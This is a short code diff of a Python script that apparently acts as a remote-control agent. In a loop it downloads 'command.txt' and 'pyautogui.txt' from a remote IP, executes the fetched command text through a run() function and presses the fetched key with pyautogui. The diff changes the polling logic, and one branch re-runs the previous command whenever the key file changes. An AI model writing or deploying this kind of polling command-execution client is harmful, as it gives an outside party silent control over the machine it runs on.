@@ -21,15 +21,20 @@ def run(cmd):
 
 
 
-old = ""
+oldCmd = ""
+oldGui = ""
 while (flag):
-    payload = getFile(ip+"/command.txt")
-    print(str(payload))
-    if(old != payload):
-        old = payload
-        print(run(old))
-        time.sleep(2.5 )
-        pyautogui.press(' ')
+    cmd = getFile(ip+"/command.txt")
+    gui = getFile(ip+"/pyautogui.txt")
+    print(str(cmd))
+    if(oldGui != gui):
+        oldGui = gui
+        pyautogui.press(oldGui)
+        print(run(oldCmd))
+    if (oldCmd != cmd):
+        oldCmd = cmd
+        print(run(oldCmd))
+
 
 
     time.sleep(2)
